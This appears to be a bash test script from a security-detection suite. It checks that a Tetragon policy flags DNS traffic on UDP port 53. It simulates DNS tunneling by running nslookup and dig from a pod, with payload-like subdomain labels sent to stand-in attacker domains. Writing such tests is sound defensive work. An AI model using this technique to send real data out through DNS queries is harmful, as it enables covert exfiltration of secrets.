#!/bin/bash
# =============================================================================
#  06-dns-exfiltration.sh — detect-dns-exfiltration
#  Policy : udp_sendmsg, DPort: 53
# =============================================================================
source "$(dirname "$0")/common.sh"

header "🧪 Test 6/10 — detect-dns-exfiltration  |  udp_sendmsg DPort 53"
log "Sending DNS queries (UDP/53) to simulate DNS tunneling"

# Encode fake exfil payload in subdomain labels
pod "nslookup dGVzdC1leGZpbC1kYXRh.attacker.example.com    8.8.8.8 2>/dev/null || true"
pod "nslookup secret-data-chunk-1.evil.example.com           1.1.1.1 2>/dev/null || true"
pod "dig @8.8.8.8 exfiltrated-payload.attacker.io            2>/dev/null || true"

ok "DNS exfiltration simulated"
log "→ Tetragon should emit udp_sendmsg events with destination port 53"